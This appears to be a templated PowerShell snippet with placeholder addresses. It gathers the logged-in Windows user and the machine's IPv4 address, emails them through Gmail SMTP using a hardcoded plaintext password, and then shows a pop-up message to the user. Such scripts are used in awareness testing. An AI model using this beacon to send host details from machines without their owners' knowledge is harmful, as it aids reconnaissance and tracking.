$name = "<gmailsource>@gmail.com";
$pass = "<gmailsourcepass>" | ConvertTo-SecureString -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential("$name",$pass);
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address | Out-String; $From = "<gmailsource>@gmail.com";
$To = "<destination>@<domain>.com";
$Cc = "<destination2>@<domain>.com";
$Subject = "Email Subject";
$Body = "`n`n`nHostname and User: `n$user `n$ipV4"; $SMTPServer = "smtp.gmail.com";
$SMTPPort = "587";
Send-MailMessage -From $From -to $To -Cc $Cc -Subject $Subject ` -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl ` -Credential $creds;
msg $env:UserName <enter message here>
